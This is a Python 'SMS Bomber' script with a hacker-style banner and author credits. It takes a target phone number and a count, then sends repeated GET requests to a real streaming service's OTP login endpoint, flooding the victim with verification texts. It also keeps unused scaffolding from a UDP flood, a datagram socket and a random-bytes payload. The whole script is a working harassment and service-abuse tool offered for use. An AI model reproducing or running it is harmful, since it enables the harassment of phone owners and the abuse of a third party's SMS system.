import requests
# Get
import smtplib
import sys
import os  
import time
import socket
import random


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############


os.system("clear")
time.sleep(2)
print ("\033[32m")
psb("\n\n[!] Loading.....")
time.sleep(2)
psb("\n[!] Please Wait.....")
time.sleep(2.7)


os.system("clear")
print("""


██████╗░░█████╗░██████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██║░░██║███████║██████╔╝█████═╝░
██║░░██║██╔══██║██╔══██╗██╔═██╗░
██████╔╝██║░░██║██║░░██║██║░╚██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝

██╗░░░██╗░█████╗░██╗░░░██╗
██║░░░██║██╔══██╗██║░░░██║
╚██╗░██╔╝███████║██║░░░██║
░╚████╔╝░██╔══██║██║░░░██║
░░╚██╔╝░░██║░░██║╚██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░

		🎉 WELCOME TO D1ARK-VA4U3 🎉
""")
print ("\033[32m")
print("#------------------------------------------------#")
psb("\n[!] Please Wait few sec[!].....")
print("#------------------------------------------------#")
time.sleep(3)

os.system("clear")

print ("\033[36m")
print("""
#------------------------------------------------#
#  		     SMS Bomber           	 #
#             CODED BY : D1ARK-VA4U3             #
#------------------------------------------------#
#  Github  : https://github.com/D1ARK-VA4U3/     #
# Facebook: https://www.facebook.com/Arif.vau143 #
#  Telegram : https://t.me/D1arkva4u3 	 #
#------------------------------------------------#
#               【﻿ Thanks to Rh King】 	 	 #
#------------------------------------------------#
""")
time.sleep(3)
print ("\033[35m")
print("#------------------------------------------------#")
number=str(input(" Enter Your Number : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
amount=int(input("Enter Your Amount :"))
print ("\033[37m")
for i in range(amount):
	requests.get(api)
	print(str(i+1)+"->SMS SENT SUCCESSFULLY")